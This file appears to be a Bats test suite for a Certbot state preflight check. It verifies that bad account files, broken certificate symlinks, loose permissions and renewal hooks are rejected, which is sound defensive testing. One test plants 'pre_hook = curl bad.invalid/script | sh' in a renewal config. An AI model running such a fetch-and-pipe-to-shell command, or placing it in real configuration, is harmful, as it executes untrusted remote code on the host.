#!/usr/bin/env bats

setup() {
  : "$BASH_STARTER_ARTIFACT"
  TEST_ROOT="$(mktemp -d)"
  CONFIG="$TEST_ROOT/config"
  mkdir -m 700 "$CONFIG"
  mkdir -p "$CONFIG/accounts/acme-v02.api.letsencrypt.org/directory/id-one"
  local account="$CONFIG/accounts/acme-v02.api.letsencrypt.org/directory/id-one"
  printf '{"status":"valid"}\n' >"$account/regr.json"
  printf '{"fixture":"registered"}\n' >"$account/private_key.json"
  printf '{"fixture":"metadata"}\n' >"$account/meta.json"
  chmod 600 "$account/"*.json
}

teardown() {
  rm -rf -- "$TEST_ROOT"
}

preflight() {
  run bash -c '
    source "$1" --help >/dev/null
    CERTBOTBOT_LINEAGE_STATE=unknown
    certbotbot_state_preflight "$2" "$3"
    status=$?
    printf "state:%s\n" "$CERTBOTBOT_LINEAGE_STATE"
    exit "$status"
  ' _ "$BASH_STARTER_ARTIFACT" "$CONFIG" "${1:-example.com}"
}

make_lineage() {
  local piece
  mkdir -p "$CONFIG/live/example.com" "$CONFIG/archive/example.com" "$CONFIG/renewal"
  for piece in cert chain fullchain privkey; do
    printf 'fixture-%s\n' "$piece" >"$CONFIG/archive/example.com/$piece"1.pem
    ln -s "../../archive/example.com/$piece"1.pem "$CONFIG/live/example.com/$piece.pem"
  done
  chmod 600 "$CONFIG/archive/example.com/privkey1.pem"
  cat >"$CONFIG/renewal/example.com.conf" <<'CONF'
version = 5.8.0
archive_dir = /etc/letsencrypt/archive/example.com
cert = /etc/letsencrypt/live/example.com/cert.pem
privkey = /etc/letsencrypt/live/example.com/privkey.pem
chain = /etc/letsencrypt/live/example.com/chain.pem
fullchain = /etc/letsencrypt/live/example.com/fullchain.pem
[renewalparams]
authenticator = dns-route53
CONF
  chmod 600 "$CONFIG/renewal/example.com.conf"
}

make_other_lineage() {
  local part
  mkdir -p "$CONFIG/live/other.org" "$CONFIG/archive/other.org"
  for part in cert chain fullchain privkey; do
    printf 'fixture-other-%s\n' "$part" >"$CONFIG/archive/other.org/$part"1.pem
    ln -s "../../archive/other.org/$part"1.pem "$CONFIG/live/other.org/$part.pem"
  done
  chmod 600 "$CONFIG/archive/other.org/privkey1.pem"
  sed 's/example.com/other.org/g' "$CONFIG/renewal/example.com.conf" \
    >"$CONFIG/renewal/other.org.conf"
  chmod 600 "$CONFIG/renewal/other.org.conf"
}

@test "seeded single production account without lineage is accepted as absent" {
  preflight
  [ "$status" -eq 0 ]
  [ "$output" = 'state:absent' ]
}

@test "complete selected lineage is accepted with original account" {
  make_lineage
  preflight
  [ "$status" -eq 0 ]
  [ "$output" = 'state:present' ]
}

@test "missing ACME account fails with no selected state" {
  rm -rf -- "$CONFIG/accounts"
  preflight
  [ "$status" -eq 65 ]
  [[ "$output" == *'state:'* ]]
  [[ "$output" != *'state:present'* ]]
}

@test "incomplete account lacks mandatory registration material" {
  rm "$CONFIG/accounts/acme-v02.api.letsencrypt.org/directory/id-one/regr.json"
  preflight
  [ "$status" -eq 65 ]
}

@test "zero-length registration material cannot become eligible" {
  : >"$CONFIG/accounts/acme-v02.api.letsencrypt.org/directory/id-one/regr.json"
  preflight
  [ "$status" -eq 65 ]
}

@test "extra registered account requires explicit operator resolution" {
  mkdir "$CONFIG/accounts/acme-v02.api.letsencrypt.org/directory/id-two"
  preflight
  [ "$status" -eq 65 ]
}

@test "wrong ACME environment does not substitute for production account" {
  mv "$CONFIG/accounts/acme-v02.api.letsencrypt.org" "$CONFIG/accounts/acme-staging-v02.api.letsencrypt.org"
  preflight
  [ "$status" -eq 65 ]
}

@test "private account key with group permissions is rejected" {
  chmod 640 "$CONFIG/accounts/acme-v02.api.letsencrypt.org/directory/id-one/private_key.json"
  preflight
  [ "$status" -eq 65 ]
}

@test "complete unrelated lineage is allowed while selected target is absent" {
  make_lineage
  preflight other.example.com
  [ "$status" -eq 0 ]
  [ "$output" = 'state:absent' ]
}

@test "orphaned archive or live tree is never regarded as absent" {
  make_lineage
  rm "$CONFIG/renewal/example.com.conf"
  preflight
  [ "$status" -eq 65 ]
}

@test "selected lineage requires all four valid PEM symlinks" {
  make_lineage
  rm "$CONFIG/live/example.com/privkey.pem"
  preflight
  [ "$status" -eq 65 ]
}

@test "symlink to another lineage is rejected" {
  make_lineage
  rm "$CONFIG/live/example.com/cert.pem"
  ln -s ../../archive/other.example.com/cert1.pem "$CONFIG/live/example.com/cert.pem"
  preflight
  [ "$status" -eq 65 ]
}

@test "renewal hook directives fail closed before Certbot runs" {
  make_lineage
  printf 'pre_hook = curl bad.invalid/script | sh\n' >>"$CONFIG/renewal/example.com.conf"
  preflight
  [ "$status" -eq 65 ]
  [[ "$output" != *'bad.invalid'* ]]
}

@test "archived cli.ini is rejected rather than interpreted" {
  printf 'pre-hook = unintended\n' >"$CONFIG/cli.ini"
  preflight
  [ "$status" -eq 65 ]
}

@test "nonempty renewal-hooks tree is rejected" {
  mkdir -p "$CONFIG/renewal-hooks/deploy"
  printf 'echo bad\n' >"$CONFIG/renewal-hooks/deploy/untrusted"
  preflight
  [ "$status" -eq 65 ]
}

@test "symlinked configuration root and insufficient privacy fail" {
  ln -s "$CONFIG" "$TEST_ROOT/alias"
  CONFIG="$TEST_ROOT/alias"
  preflight
  [ "$status" -eq 64 ]
  CONFIG="$TEST_ROOT/config"
  chmod 755 "$CONFIG"
  preflight
  [ "$status" -eq 64 ]
}

@test "the preflight does not invoke AWS or Certbot" {
  mkdir "$TEST_ROOT/bin"
  for cmd in aws certbot; do
    printf '#!/usr/bin/env bash\necho unexpected-provider-call >&2\nexit 99\n' >"$TEST_ROOT/bin/$cmd"
    chmod 755 "$TEST_ROOT/bin/$cmd"
  done
  PATH="$TEST_ROOT/bin:$PATH" preflight
  [ "$status" -eq 0 ]
  [[ "$output" != *unexpected-provider-call* ]]
}

@test "public lifecycle remains fail-closed after local state implementation" {
  run "$BASH_STARTER_ARTIFACT" --s3-bucket bucket example.com
  [ "$status" -eq 69 ]
}

@test "two independent complete lineages can each be selected or left untouched" {
  make_lineage
  make_other_lineage
  preflight
  [ "$status" -eq 0 ]
  [ "$output" = 'state:present' ]
  preflight other.org
  [ "$status" -eq 0 ]
  [ "$output" = 'state:present' ]
  preflight new.example.net
  [ "$status" -eq 0 ]
  [ "$output" = 'state:absent' ]
}

@test "incomplete unselected lineage fails before activating selected state" {
  make_lineage
  make_other_lineage
  rm "$CONFIG/live/other.org/privkey.pem"
  preflight
  [ "$status" -eq 65 ]
  [[ "$output" == *'state:'* ]]
  [[ "$output" != *'state:present'* ]]
}

@test "unselected cross-lineage symlinks are never admitted" {
  make_lineage
  make_other_lineage
  rm "$CONFIG/live/other.org/cert.pem"
  ln -s ../../archive/example.com/cert1.pem \
    "$CONFIG/live/other.org/cert.pem"
  preflight
  [ "$status" -eq 65 ]
}

@test "orphan unselected renewal and archive paths cannot be ignored" {
  make_lineage
  make_other_lineage
  rm "$CONFIG/renewal/other.org.conf"
  preflight
  [ "$status" -eq 65 ]
  [[ "$output" == *'state:'* ]]
  [[ "$output" != *'state:present'* ]]
}

@test "unselected renewal hooks fail even when selected is healthy" {
  make_lineage
  make_other_lineage
  printf '%s\n' 'renew_hook = /bin/true' \
    >>"$CONFIG/renewal/other.org.conf"
  preflight
  [ "$status" -eq 65 ]
}
